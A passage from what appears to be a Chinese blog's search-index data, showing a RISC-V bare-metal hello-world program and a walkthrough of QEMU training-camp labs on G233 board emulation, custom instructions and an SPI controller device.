$(CFLAGS) -c $&lt; -o $@%.o: %.S\t$(CC) $(CFLAGS) -c $&lt; -o $@$(TARGET).elf: $(OBJS) linker.ld\t$(LD) $(LDFLAGS) -o $@ $(OBJS)$(BIN): $(TARGET).elf\t$(OBJCOPY) -O binary $&lt; $@\t$(OBJDUMP) -d -S $&lt; &gt; $(TARGET).asm\t$(OBJDUMP) -t $&lt; | sed &#x27;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d&#x27; &gt; $(TARGET).symclean:\trm -f *.o *.elf *.bin *.asm *.sym *.d\nentry.S.section .text.entry.global _entry_entry:        # sp = stack0 + (hartid * 4096)        la sp, stack0        li a0, 1024 * 4        csrr a1, mhartid        addi a1, a1, 1        mul a0, a0, a1        add sp, sp, a0                # 只让 core0 执行 start        # 其余核心自旋        csrr t0, mhartid        bnez t0, spin        # jump to start() in main.c        call startspin:        wfi        j spin\ndef.h/* 支持的最大 CPU 核心数 */#define NCPU 4/* 内存映射的串口寄存器地址 (QEMU virt 机器) */#define UART_BASE 0x10000000#define UART_TXDATA (*(volatile uint32_t *)(UART_BASE + 0x0))\nmain.c#include &lt;stdint.h&gt;#include &quot;def.h&quot;__attribute__ ((aligned (16))) char stack0[4096 * NCPU];/* 发送单个字符到串口 */void uart_putchar(char c) &#123;    UART_TXDATA = c;&#125;/* 发送字符串到串口 */void uart_puts(const char *str) &#123;    while (*str) &#123;        uart_putchar(*str++);    &#125;&#125;void start() &#123;    /* 输出启动消息 */    uart_puts(&quot;===== RISC-V Baremetal Program =====\\n&quot;);    uart_puts(&quot;Hello World!\\n&quot;);    /* 停机循环 */    while (1) &#123;        asm volatile(&quot;wfi&quot;);  /* 等待中断 */    &#125;&#125;\nlinker.ldOUTPUT_ARCH(&quot;riscv&quot;)ENTRY(_entry)MEMORY &#123;    RAM (rwx) : ORIGIN = 0x80000000, LENGTH = 128M&#125;SECTIONS&#123;    .text : &#123;        *(.text.entry)        *(.text .text.*)    &#125; &gt; RAM    .rodata : &#123;        . = ALIGN(16);        *(.srodata .srodata.*)        . = ALIGN(16);        *(.rodata .rodata.*)    &#125; &gt; RAM    .data : &#123;        . = ALIGN(16);        *(.sdata .sdata.*)        . = ALIGN(16);        *(.data .data.*)    &#125; &gt; RAM    .bss : &#123;        . = ALIGN(16);        *(.sbss .sbss.*)        . = ALIGN(16);        *(.bss .bss.*)    &#125; &gt; RAM&#125;\nQEMU 启动命令qemu-system-riscv64 \\    -machine virt \\    -bios none \\    -kernel firmware.elf \\    -m 128M \\    -smp 4 \\    -nographic \\    -monitor telnet:localhost:7106,server,nowait,nodelay\n","categories":["操作系统"],"tags":["操作系统","C"]},{"title":"QEMU训练营2025专业阶段实验解析","url":"/2025/10/28/QEMU%E8%AE%AD%E7%BB%83%E8%90%A52025%E4%B8%93%E4%B8%9A%E9%98%B6%E6%AE%B5%E5%AE%9E%E9%AA%8C%E8%A7%A3%E6%9E%90/","content":"本人的研究方向主要是操作系统与虚拟化，平时接触最多的开源项目除了 Linux 内核外，便是 QEMU 了，不只是将它作为一个全系统模拟器和 VMM 来使用，还涉及到基于它的增量开发的工作。但这些基本都还是边做边学的，主要原因在于市面上一直缺乏系统性介绍 QEMU 的书籍和资料（我知道的仅有一本《QEMU/KVM 源码解析与应用》，但其主要专注于 QEMU 的 VMM 用途，对模拟器的介绍不是重点）。得知 OpenCamp 将举办 QEMU 训练营，我也是在持续关注，并且在第一时间报名并开展了学习。\n截至现在，我已经完成了基础阶段和专业阶段的学习，正在等待项目阶段的开放。本文将分享我专业阶段实验的解题思路和方法，作为个人的一个记录，也为后续参与训练营的同学提供参考。\n\n实验概述专业阶段的实验平台是由训练营主办方专门设计的一个简易的教学用板卡 G233，对它的介绍可以参考文档：b. G233 Datasheet - Learning QEMU Docs。\n实验共有十个，归类下来总共有三类：lab1 主要是根据手册的说明，补全对 G233 板卡的模拟代码；lab2 ~ lab5 则是为 RISC-V 指令集新增自定义指令；lab6 ~ lab10 是为 G233 新增一个自定义的 SPI 控制器设备。下面我也将按照这样的归类，分三个部分来一一介绍。\nlab1 G233 板卡模拟lab1 目标是实现对 G233 板卡的模拟，但其实绝大部分的代码已经写好了，需要做的只是将部分缺失的代码补充完整，因此本实验的主要目的还是熟悉 QEMU 设备模拟相关流程和一些 API 接口的使用，实验过程中可以参考 QEMU 代码目录下其他板卡（比如我参考了 xiangshan_kmh.c）的代码实现，后面的 SPI 设备模拟也是同理。\nG233 板卡的组件构成如下：\ntypedef struct G233SoCState &#123;    /*&lt; private &gt;*/    DeviceState parent_obj;    /*&lt; public &gt;*/    RISCVHartArrayState cpus;    DeviceState *plic;    DeviceState *uart0;    DeviceState *pwm0;    SIFIVEGPIOState gpio;    MemoryRegion mask_rom;&#125; G233SoCState;typedef struct G233MachineState &#123;    /*&lt; private &gt;*/    MachineState parent_obj;    /*&lt; public &gt;*/    G233SoCState soc;&#125; G233MachineState;\n需要自定义的类型有两个：G233 主板（G233MachineState）和 G233 的 SoC（G233SocState），其他的设备如 PLIC 和 UART 等都直接采用了 QEMU 代码库中的现有实现。我们下面直接以 SoC 为例介绍 QEMU 自定义类型的代码实现流程。\n下列代码就是常见的添加一个 QEMU 新类型的基本操作，基本上对于绝大部分的类型都适用，而其底层实现原理不在本文的讨论范围内。\nstatic const TypeInfo g233_soc_type_info = &#123;    .name = TYPE_RISCV_G233_SOC,    .parent = TYPE_DEVICE,    .instance_size = sizeof(G233SoCState),    .instance_init = g233_soc_init,    .class_init = g233_soc_class_init,&#125;;static void g233_soc_register_types(void)&#123;    type_register_static(&amp;g233_soc_type_info);&#125;type_init(g233_soc_register_types)\n.name、.parent、instance_size 这些字段想必不用过多介绍了，我们主要关注 class_init 和 instance_init 接口的实现。\n这两个函数接口的区别顾名思义，一个用于类的初始化，一个用于实例（对象）的初始化。如果用 C++ 这样面向对象的编程语言的概念来套的话，可以理解为：class_init 用于完成 类的每个对象所共有属性和状态 的初始化，如成员函数、静态成员变量等；而 instance_init 则用于完成 类的每个对象所私有属性和状态 的初始化，如非静态成员变量，更直接一点说，instance_init 接口其实就相当于类的构造函数。\n相信有了上面的认识，要理解 G233 SoC 的初始化代码也不那么困难了。G233 的 class_init 接口完成的工作就是设置其父类 DeviceClass 的 realize 接口为 G233 SoC 类特定的接口 g233_soc_realize，这样运行时动态绑定的过程是不是很熟悉？没错，这其实就是 QOM 实现的类似 C++ 虚函数 的功能，子类在程序运行时动态绑定父类的函数接口，从而实现 运行时多态 。因此，我们在理解代码时不妨将 class_init 接口看作是一个间接层，它只是进行一系列的动态绑定操作，实际需要关注的则是子类对父类接口的特定实现，在 G233 SoC 中，它只实现了 realize 接口。\nstatic void g233_soc_class_init(ObjectClass *oc, const void *data)&#123;    DeviceClass *dc = DEVICE_CLASS(oc);    dc-&gt;realize = g233_soc_realize;&#125;\n我们接下来具体分析 realize 接口的实现，其中新增的代码用 //+ 来进行标识。\n我们需要新增的代码是 CPU 的实例化，实例化的过程是先设置设备一些属性（property）：\n\nnum-harts 表示 CPU 的核心数量，通常通过 QEMU 的启动参数 -smp 来指定，由于 g233_machine_class_init 中将最大 CPU 数量设置为了 1，因此这里我们直接指定为 1.\nhartid-base 表示 CPU 核心（HART）的起始编号，通常指定为 0 即可。\ncpu-type 表示 CPU 的类型，实验代码已经在 target/riscv/cpu-qom.h 中声明好了，直接添加即可。\nresetvec 需要重点关注，它表示 CPU 在上电或复位后 PC 指向的指令地址，g233_soc_init 中的注释也提到了它为 0x1004，即 ROM 中的固件代码，用于实际跳转到程序中开始执行。\n\n\n 关于 RISCVHartArrayState 有哪些属性可以查看代码 hw/riscv/riscv_hart.c:riscv_harts_props 处的内容。\n\n最后调用 qdev_realize 的封装函数 sysbus_realize 完成实例化。\n后面的一系列代码通过调用 plic 和 uart 等设备的特定接口，进行设备的创建，并将设备寄存器映射到物理地址空间中，也就是 MMIO。\nstatic void g233_soc_realize(DeviceState *dev, Error **errp)&#123;    MachineState *ms = MACHINE(qdev_get_machine());    G233SoCState *s = RISCV_G233_SOC(dev);    MemoryRegion *sys_mem = get_system_memory();    const MemMapEntry *memmap = g233_memmap;    //+ uint32_t num_harts = ms-&gt;smp.cpus;    /* CPUs realize */    //+ qdev_prop_set_uint32(DEVICE(&amp;s-&gt;cpus), &quot;num-harts&quot;, num_harts);    //+ qdev_prop_set_uint32(DEVICE(&amp;s-&gt;cpus), &quot;hartid-base&quot;, 0);    //+ qdev_prop_set_string(DEVICE(&amp;s-&gt;cpus), &quot;cpu-type&quot;,    //+                 TYPE_RISCV_CPU_GEVICO_G233);    //+ qdev_prop_set_uint64(DEVICE(&amp;s-&gt;cpus), &quot;resetvec&quot;,    //+                 memmap[G233_DEV_MROM].base + 0x4);    //+ sysbus_realize(SYS_BUS_DEVICE(&amp;s-&gt;cpus), &amp;error_fatal);    /* Mask ROM */    memory_region_init_rom(&amp;s-&gt;mask_rom, OBJECT(dev), &quot;riscv.g233.mrom&quot;,                           memmap[G233_DEV_MROM].size, &amp;error_fatal);    memory_region_add_subregion(sys_mem, memmap[G233_DEV_MROM].base,                                &amp;s-&gt;mask_rom);    /* MMIO */    s-&gt;plic = sifive_plic_create(memmap[G233_DEV_PLIC].base,                                 (char *)G233_PLIC_HART_CONFIG, ms-&gt;smp.cpus, 0,                                 G233_PLIC_NUM_SOURCES,                                 G233_PLIC_NUM_PRIORITIES,                                 G233_PLIC_PRIORITY_BASE,                                 G233_PLIC_PENDING_BASE,                                 G233_PLIC_ENABLE_BASE,                                 G233_PLIC_ENABLE_STRIDE,                                 G233_PLIC_CONTEXT_BASE,                                 G233_PLIC_CONTEXT_STRIDE,                                 memmap[G233_DEV_PLIC].size);    riscv_aclint_swi_create(memmap[G233_DEV_CLINT].base,                            0, ms-&gt;smp.cpus, false);\t[...]&#125;\ninstance_init 接口通常只用于完成在设备实例化前的必要工作，比如这里通过调用 object_initialize_child 初始化其内嵌的设备对象，并建立子对象与父对象之间的依赖关系。\nstatic void g233_soc_init(Object *obj)&#123;    /*     * You can add more devices here(e.g. cpu, gpio)     * Attention: The cpu resetvec is 0x1004     */    //+ G233SoCState *s = RISCV_G233_SOC(obj);    //+ object_initialize_child(obj, &quot;cpus&quot;, &amp;s-&gt;cpus, TYPE_RISCV_HART_ARRAY);    //+ object_initialize_child(obj, &quot;gpio&quot;, &amp;s-&gt;gpio, TYPE_SIFIVE_GPIO);&#125;\n最后总结，下面是我根据个人理解，用 C++ 编写的一个简单的程序，用于表示 QOM 设备模型，只用于辅助理解，语义上并不一定和 QOM 等同。\n简单一点来说，上述三个函数接口执行的先后顺序为 class_init -&gt; instance_init -&gt; realize。class_init 完成类对象共享成员的初始化，由于本设备只涉及成员函数，而不涉及到类似静态成员变量的概念，因此这部分在 C++ 中直接通过虚函数在语言层面便完成了实现。instance_init 可以看作是类的构造函数，且该构造函数应该 尽可能精简 ，精简到只调用其内嵌类型成员的无参构造函数。realize 成员函数则用于完成设备的完整实例化，包括动态创建指针类型成员和设置内嵌类型成员的成员变量（属性）。\n#include &lt;iostream&gt;class GpioController &#123;private:    std::string name;public:    GpioController() &#123;        std::cout &lt;&lt; &quot;GPIO 在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被构造&quot; &lt;&lt; std::endl;    &#125;    ~GpioController() &#123;        std::cout &lt;&lt; &quot;GPIO 在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被析构&quot; &lt;&lt; std::endl;    &#125;    void set_name(const std::string &amp;name) &#123;        this-&gt;name = name;        std::cout &lt;&lt; &quot;GPIO 名称被设置为 &quot; &lt;&lt; name &lt;&lt; std::endl;    &#125;&#125;;class CpuCluster &#123;private:    int num_cores;public:    CpuCluster() &#123;        std::cout &lt;&lt; &quot;CPU 集群在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被构造&quot; &lt;&lt; std::endl;    &#125;    ~CpuCluster() &#123;        std::cout &lt;&lt; &quot;CPU 集群在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被析构&quot; &lt;&lt; std::endl;    &#125;    void set_num_cores(int num_cores) &#123;        this-&gt;num_cores = num_cores;        std::cout &lt;&lt; &quot;CPU 核心数被设置为 &quot; &lt;&lt; num_cores &lt;&lt; std::endl;    &#125;&#125;;class SiFivePLIC &#123;public:    SiFivePLIC() &#123;        std::cout &lt;&lt; &quot;SiFivePLIC 在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被构造&quot; &lt;&lt; std::endl;    &#125;    ~SiFivePLIC() &#123;        std::cout &lt;&lt; &quot;SiFivePLIC 在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被析构&quot; &lt;&lt; std::endl;    &#125;&#125;;class Device &#123;public:    Device() &#123;        std::cout &lt;&lt; &quot;Device 在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被构造&quot; &lt;&lt; std::endl;    &#125;    ~Device() &#123;        std::cout &lt;&lt; &quot;Device 在地址 &quot; &lt;&lt; this &lt;&lt; &quot; 处被析构&quot; &lt;&lt; std::endl;    &#125;    virtual void realize() &#123;        std::cout &lt;&lt; &quot;virtual realize&quot; &lt;&lt; std::endl;    &#125;&#125;;class G233SoC : public Device &#123;private:    // 内嵌类型成员    CpuCluster cpus;    GpioController gpio;    // 指针类型成员    SiFivePLIC *plic;public:    // 构造函数相当于 instance_init    G233SoC() : cpus(), gpio(), plic(nullptr) &#123;        // instance_init 应尽可能精简，且不允许失败        std::cout &lt;&lt; &quot;G233SoC 构造函数主体&quot; &lt;&lt; std::endl;    &#125;    ~G233SoC() &#123;        delete plic;    &#125;    // 相当于 class_init，C++ 在语言层面实现了动态绑定    void realize() override &#123;        // QOM 设备模型通常在 realize 中进行属性设置等具体的实例化操作        std::cout &lt;&lt; &quot;开始 realize&quot; &lt;&lt; std::endl;        plic = new SiFivePLIC();        gpio.set_name(&quot;gpio0&quot;);        cpus.set_num_cores(1);        std::cout &lt;&lt; &quot;realize 完成&quot; &lt;&lt; std::endl;    &#125;&#125;;int main() &#123;    G233SoC my_soc;    my_soc.realize();    return 0;&#125;\n\n 有关 instance_init 和 realize 的区别，以及如何实现它们的 best practice，可以参考文章：QEMU’s instance_init() vs. realize()\n\nG233 Machine 的初始化也是类似，只不过实例化接口从 realize 变成了 init。还是采用上面提到的 best practice，在 instance_init 中只完成简单的 object_initialize_child，主要的实例化工作放到 init 中来完成，在此就不再介绍了。\nlab2 ~ lab5 新增自定义指令lab2 ~ 5 和 G233 板卡基本没什么关联，主要是理解 QEMU RISC-V 模拟器指令从格式声明到功能定义的全过程。只要完成了一个，后面几个大部分的工作就只是复制粘贴了，下面我们以 lab2 的 dma 指令为例进行介绍。\n首先需要声明指令的格式，这部分需要首先理解 QEMU RISC-V 引入的 Decodetree 的使用方式，可以参考在线讲义中的内容：Decodetree - Learning QEMU Docs。由于我们新增指令为 32 位，因此在 target/riscv/insn32.decode 中进行添加。\ndiff --git a/target/riscv/insn32.decode b/target/riscv/insn32.decodeindex cd23b1f..230f6ce 100644--- a/target/riscv/insn32.decode+++ b/target/riscv/insn32.decode@@ -111,6 +111,9 @@ # Formats 128: @sh6       ...... ...... ..... ... ..... ....... &amp;shift shamt=%sh6 %rs1 %rd +# *** Learning QEMU ***+dma        0000110  ..... ..... 110 ..... 1111011 @r+ # *** Privileged Instructions *** ecall       000000000000     00000 000 00000 1110011 ebreak      000000000001     00000 000 00000 111001\n接下来，Decodetree 脚本将会根据指令的声明，自动生成对应的译码代码和相应的指令功能函数 trans_&lt;insn_name&gt; 的声明，同时在译码完成后对其进行调用，本指令名为“dma”，因此它会生成 trans_dma 的声明，我们需要将其实现。\n\n若想要观察 Decodetree 生成代码的具体内容，可以查看 build/libqemu-riscv64-softmmu.a.p/decode-insn32.c.inc。\n\ndiff --git a/target/riscv/insn_trans/trans_rvi.c.inc b/target/riscv/insn_trans/trans_rvi.c.incindex b9c7160..7283e02 100644--- a/target/riscv/insn_trans/trans_rvi.c.inc+++ b/target/riscv/insn_trans/trans_rvi.c.inc@@ -18,6 +18,17 @@  * this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.  */ +/* Learning QEMU */+static bool trans_dma(DisasContext *ctx, arg_dma *a)+&#123;+    TCGv dst = get_gpr(ctx, a-&gt;rd, EXT_NONE);+    TCGv src = get_gpr(ctx, a-&gt;rs1, EXT_NONE);+    TCGv grain = get_gpr(ctx, a-&gt;rs2, EXT_NONE);++    gen_helper_dma(tcg_env, dst, src, grain);+    return true;+&#125;+\n\n这里的 trans_rvi.c.inc 是我随意选取的位置，并非指令实际的类型。\n\n由于 dma 指令的功能相对复杂，难以直接用 QEMU 的 TCG IR 来实现，因此需要借助于 helper 函数。helper 函数也分为声明和定义两部分，声明的格式可以参考 target/riscv/helper.h 中的其他实现。\ndiff --git a/target/riscv/helper.h b/target/riscv/helper.hindex f712b1c..0b2294a 100644--- a/target/riscv/helper.h+++ b/target/riscv/helper.h@@ -1,3 +1,6 @@+/* Learninig QEMU */+DEF_HELPER_4(dma, void, env, tl, tl, tl)+\n最后便是对 helper 函数进行实现，实现部分就很简单了，当然若不想自己手动实现的话，也可以直接参考测试程序的写法。\ndiff --git a/target/riscv/op_helper.c b/target/riscv/op_helper.cindex 110292e..b0e2407 100644--- a/target/riscv/op_helper.c+++ b/target/riscv/op_helper.c@@ -28,6 +28,30 @@ #include &quot;exec/tlb-flags.h&quot; #include &quot;trace.h&quot; +/* Learning QEMU */+void helper_dma(CPURISCVState *env, uintptr_t dst,+                uintptr_t src, target_ulong grain)+&#123;+    int n;+    int i, j;+    float val;+    uintptr_t src_p, dst_p;++    if (grain &gt; 2) &#123;+        riscv_raise_exception(env, RISCV_EXCP_ILLEGAL_INST, GETPC());+    &#125;++    n = 1 &lt;&lt; (grain + 3);+    for (i = 0; i &lt; n; ++i) &#123;+        for (j = 0; j &lt; n; ++j) &#123;+            src_p = src + (i * n + j) * sizeof(float);+            dst_p = dst + (j * n + i) * sizeof(float);+            val =  make_float32(cpu_ldl_data(env, src_p));+            cpu_stl_data(env, dst_p, float32_val(val));+        &#125;+    &#125;+&#125;+ /* Exceptions processing helpers */ G_NORETURN void riscv_raise_exception(CPURISCVState *env,                                       RISCVException exception,\n事实上，对于完整的指令新增流程而言，还需要在反汇编器 disas/riscv.c 中添加对应指令的逻辑，以便于调试。但是测试程序只关注指令的功能，因此我在此没有实现。\n剩余的几条指令实现方式和 dma 基本一致，在此就不过多赘述了。\nlab6 ~ lab10 扩展 SPI 设备lab6 ~ lab10 需要新增一个设备的模拟，并将其与 G233 主板连接起来，这也是三部分实验中最有挑战性的一个，这部分建议参考其他 SPI 设备比如 SiFiveSPI 的实现。由于涉及到的代码较多，下面我将选取一些关键点以及我在做实验的过程中感到有些困惑的地方进行介绍。\n与 SoC 和从设备的连接G233 SPI 设备作为一个独立的设备实现，要想起作用，必然要与我们的 G233 SoC 进行连接，具体分为以下几个操作：\n\n将 G233 SPI 的设备寄存器映射到系统内存（MMIO）中，通过调用 sysbus_mmio_map 函数实现。\n将 G233 SPI 的中断信号线连接到 G233 SoC 的中断控制器 PLIC，通过调用 sysbus_connect_irq 函数实现。\n\nstatic void g233_soc_realize(DeviceState *dev, Error **errp)&#123;\t[...]    /* G233 SPI device */    sysbus_realize(SYS_BUS_DEVICE(&amp;s-&gt;spi), errp);    sysbus_mmio_map(SYS_BUS_DEVICE(&amp;s-&gt;spi), 0, memmap[G233_DEV_SPI].base);    sysbus_connect_irq(SYS_BUS_DEVICE(&amp;s-&gt;spi), 0,                       qdev_get_gpio_in(DEVICE(s-&gt;plic), G233_SPI_IRQ));&#125;\n除了与 SoC 相连外，G233 SPI 设备还需要与两个 flash 芯片相连，具体分为以下几个操作：\n\n创建题目指定的 flash 设备，并与命令行参数中传入的 flash 文件后端相关联。\n将 flash 设备 与 SSI 总线相连，用于后续 G233 SPI 向该总线中写入数据与 flash 设备通信。\n将 G233 SPI 的中断信号线连接到 flash，从而实现片选。\n\ntypedef struct G233SPIState &#123;\t[...]    SSIBus *spi;    qemu_irq irq;    qemu_irq *cs_lines;&#125; G233SPIState;\n需要注意的是手册中并没有给出运行测试程序时 QEMU 的启动参数，我们可以在执行 make 时启用详细输出（Verbose Mode）来看到：make check-gevico-tcg V=1，其参数如下：\nbuild/qemu-system-riscv64 \\    -M g233 \\    -m 2G \\    -display none \\    -semihosting \\    -serial stdio \\    -d int \\    -device loader,file=test-xxx \\    -blockdev driver=file,filename=disk0.img,node-name=flash0 \\    -blockdev driver=file,filename=disk1.img,node-name=flash1\nflash 文件后端通过 node-name 来标识，我们可以在代码中使用 blk_by_name 找到对应的 BlockBackend 对象，并通过 qdev_prop_set_drive_err 与将其与新建的 flash 设备对象进行关联。具体的代码如下所示：\nstatic void g233_machine_init(MachineState *machine)&#123;\t[...]    BlockBackend *blk0, *blk1;    DeviceState *flash_dev1, *flash_dev2;    qemu_irq flash_cs1, flash_cs2;\t[...]    /* Connect first flash to SPI */    flash_dev1 = qdev_new(&quot;w25x16&quot;);    qdev_prop_set_uint8(flash_dev1, &quot;cs&quot;, 0);    blk0 = blk_by_name(&quot;flash0&quot;);    qdev_prop_set_drive_err(flash_dev1, &quot;drive&quot;, blk0, &amp;error_fatal);    qdev_realize_and_unref(flash_dev1, BUS(s-&gt;soc.spi.spi), &amp;error_fatal);    flash_cs1 = qdev_get_gpio_in_named(flash_dev1, SSI_GPIO_CS, 0);    sysbus_connect_irq(SYS_BUS_DEVICE(&amp;s-&gt;soc.spi), 1, flash_cs1);    /* Connect second flash to SPI */    flash_dev2 = qdev_new(&quot;w25x32&quot;);    qdev_prop_set_uint8(flash_dev2, &quot;cs&quot;, 1);    blk1 = blk_by_name(&quot;flash1&quot;);    qdev_prop_set_drive_err(flash_dev2, &quot;drive&quot;, blk1, &amp;error_fatal);    qdev_realize_and_unref(flash_dev2, BUS(s-&gt;soc.spi.spi), &amp;error_fatal);    flash_cs2 = qdev_get_gpio_in_named(flash_dev2, SSI_GPIO_CS, 0);    sysbus_connect_irq(SYS_BUS_DEVICE(&amp;s-&gt;soc.spi), 2, flash_cs2);&#125;\n最终在创建完成后，可以通过 QEMU monitor 进行查看：\nQEMU 10.0.93 monitor - type &#x27;help&#x27; for more information(qemu) info qtreebus: main-system-bus  type System  dev: g233.spi, id &quot;&quot;    gpio-out &quot;sysbus-irq&quot; 5    mmio 0000000010018000/0000000000001000    bus: spi      type SSI      dev: w25x32, id &quot;&quot;        gpio-in &quot;WP#&quot; 1        gpio-in &quot;ssi-gpio-cs&quot; 1        write-enable = false        nonvolatile-cfg = 36863 (0x8fff)        spansion-cr1nv = 0 (0x0)        spansion-cr2nv = 8 (0x8)        spansion-cr3nv = 2 (0x2)        spansion-cr4nv = 16 (0x10)        drive = &quot;&quot;        cs = 1 (0x1)      dev: w25x16, id &quot;&quot;        gpio-in &quot;WP#&quot; 1        gpio-in &quot;ssi-gpio-cs&quot; 1        write-enable = false        nonvolatile-cfg = 36863 (0x8fff)        spansion-cr1nv = 0 (0x0)        spansion-cr2nv = 8 (0x8)        spansion-cr3nv = 2 (0x2)        spansion-cr4nv = 16 (0x10)        drive = &quot;&quot;        cs = 0 (0x0)[...]\n全双工同步数据传输的实现数据传输部分的实现，sifive_spi.c 和 xilinx_spi.c 等都纷纷采用了 QEMU 实现的一种数据结构 Fifo8，顾名思义，它是一个先进先出的缓冲区，很适合用来实现 SPI 这样的全双工串行数据通信。但是 G233 SPI 的 FIFO 容量只有 1（8-bit），因此直接用一个整型变量来表示更加简洁，本文接下来也直接采用这种方式。\n要实现 CPU 对 SPI 设备寄存器的访问，需要创建一个 SPI 设备的 MemoryRegion，并且实现该 MR 的 read 和 write 接口，根据传入的偏移量 offset 决定对哪个设备寄存器进行读写，最后将 MR 添加到系统内存中，实现 MMIO。MMIO 上一节已经介绍过，下面主要介绍如何实现 read 和 write 接口。\ntypedef struct G233SPIState &#123;    /*&lt; private &gt;*/    SysBusDevice parent_obj;    /*&lt; public &gt;*/    MemoryRegion iomem;    uint32_t cr1;    uint32_t cr2;    uint32_t sr;    uint32_t dr;    uint32_t csctrl;\t[...]&#125; G233SPIState;\nread 接口的实现基本没有什么需要注意的地方，主要是 DR 寄存器在读取数据后，需要设置 SR 寄存器，表示此时读缓冲区清空。\n\n这里我没有考虑读之前读缓冲区已为空的情况，而是认为读之前检查 SR 状态是设备驱动程序（即测试程序）考虑的事情。\n\nstatic uint64_t g233_spi_read(void *opaque, hwaddr offset,                              unsigned int size)&#123;    G233SPIState *s = opaque;    uint32_t val = 0;    switch (offset) &#123;\t[...]    case G233_SPI_DR:        val = s-&gt;dr;        s-&gt;sr &amp;= ~SPI_SR_RXNE;        break;\t[...]    return val;&#125;\nwrite 接口相对来说要复杂一些。CR1 和 CR2 寄存器的写没有什么特别的地方，直接写入即可。\nDR 寄存器在写入之前，需要判断缓冲区是否已满，如果是则需要设置 SR 的溢出位表示触发溢出错误；否则将数据写入到 DR 寄存器中，并设置 SR 寄存器，表示此时写缓冲区已满。在此之后，SPI 控制器的作用便体现出来了：它将写缓冲区中的数据通过 SSI 总线送到片选打开的从设备中，再将接收到的返回数据存入读缓冲区中。这部分调用的是 ssi_transfer 函数，参数为 SSI 总线和发送的数据，返回值为返回的数据。由于缓冲区的大小只有 1，因此我们不需要循环，直接单次调用即可，在将返回的数据存入 DR 寄存器前，同样需要进行溢出检查，如果此时读缓冲区已满，那么设置 SR 的溢出位表示触发溢出错误。此外，需要在整个传输过程的前后设置和清除 BSY 位。\n\n关于 BSY 位设置的时机我也不是很清楚。\n\n最后，对 CSCTRL 寄存器的写入需要更新片选信号，这部分我们下一节再详细介绍。\nstatic void g233_transfer_data(G233SPIState *s)&#123;    uint32_t retval;    s-&gt;sr |= SPI_SR_BSY;        retval = ssi_transfer(s-&gt;spi, s-&gt;dr);    if (s-&gt;sr &amp; SPI_SR_RXNE) &#123;        s-&gt;sr |= SPI_SR_OVERRUN;    &#125; else &#123;        s-&gt;dr = retval;    &#125;    s-&gt;sr |= SPI_SR_TXE;    s-&gt;sr |= SPI_SR_RXNE;    s-&gt;sr &amp;= ~SPI_SR_BSY;&#125;static void g233_spi_write(void *opaque, hwaddr offset,                           uint64_t value, unsigned int size)&#123;    G233SPIState *s = opaque;    switch (offset) &#123;\t[...]    case G233_SPI_SR:        if (value &amp; SPI_SR_OVERRUN)            s-&gt;sr &amp;= ~SPI_SR_OVERRUN;        if (value &amp; SPI_SR_UNDERRUN)            s-&gt;sr &amp;= ~SPI_SR_UNDERRUN;        break;    case G233_SPI_DR:        if (!(s-&gt;sr &amp; SPI_SR_TXE)) &#123;            s-&gt;sr |= SPI_SR_OVERRUN;        &#125; else &#123;            s-&gt;dr = (uint32_t)value;            s-&gt;sr &amp;= ~SPI_SR_TXE;            g233_transfer_data(s);        &#125;        break;    case G233_SPI_CSCTRL:        s-&gt;csctrl = (uint32_t)value;        g233_spi_update_cs(s);        break;    &#125;\t[...]&#125;\n中断传递CPU 与 I/O 设备通信的方式通常有两种：轮询和中断。对本实验的 G233 SPI 设备而言，轮询方式就是 CPU 不断读取 SR 寄存器，确认读缓冲区和写缓冲区的状态，并决定是否从 DR 寄存器中读取数据或向其写入数据。而中断方式则是 CPU 注册相应的中断处理函数，SPI 设备当读缓冲区满或写缓冲区空时向 CPU 发起中断，CPU 自动跳转到对应的中断处理函数执行相应的操作：如从读缓冲区中读取数据，或向写缓冲区中写入数据。此外，某些错误发生时，SPI 设备也要向 CPU 发起中断请求处理，lab10 的溢出检测就是这种情况。\n发起中断的函数为 qemu_set_irq，我们可以专门编写一个函数，根据此时控制寄存器和状态寄存器的值决定是否要发起中断，代码如下所示，并在对设备寄存器进行读写操作时调用。\n\n在 read、write 接口处调用中断更新是因为对 G233 SPI 设备而言，CPU 对设备寄存器的读写是 唯一可能 使得 SPI 设备状态发生变化的情况。\n\nstatic void g233_spi_update_irq(G233SPIState *s)&#123;    int level = 0;    /* Should trigger TX int ? */    if ((s-&gt;cr2 &amp; SPI_CR2_TXEIE) &amp;&amp; (s-&gt;sr &amp; SPI_SR_TXE))        level = 1;    /* Should trigger RX int ? */    if ((s-&gt;cr2 &amp; SPI_CR2_RXNEIE) &amp;&amp; (s-&gt;sr &amp; SPI_SR_RXNE))        level = 1;    /* Should trigger ERR int ? */    if ((s-&gt;cr2 &amp; SPI_CR2_ERRIE) &amp;&amp; (s-&gt;sr &amp; (SPI_SR_OVERRUN | SPI_SR_UNDERRUN)))        level = 1;    qemu_set_irq(s-&gt;irq, level);&#125;\n片选操作的实现也是类似，根据 CSCTRL 寄存器的值决定启用哪块 flash 芯片，代码如下所示，这个更新过程可以在 CSCTRL 寄存器被写入时进行，需要注意的是片选信号为 0 代表有效。\n#define CSi_EN(sr, i) \\    ( ( (sr) &gt;&gt; (i) ) &amp; 1 )#define CSi_ACT(sr, i) \\    ( ( (sr) &gt;&gt; ( (i) + 4 ) ) &amp; 1)static void g233_spi_update_cs(G233SPIState *s)&#123;    int i;    for (i = 0; i &lt; NUM_CS; i++) &#123;        if (!CSi_EN(s-&gt;csctrl, i)) &#123;            qemu_set_irq(s-&gt;cs_lines[i], 1);            continue;        &#125;        if (CSi_ACT(s-&gt;csctrl, i)) &#123;            qemu_set_irq(s-&gt;cs_lines[i], 0);        &#125; else &#123;            qemu_set_irq(s-&gt;cs_lines[i], 1);        &#125;    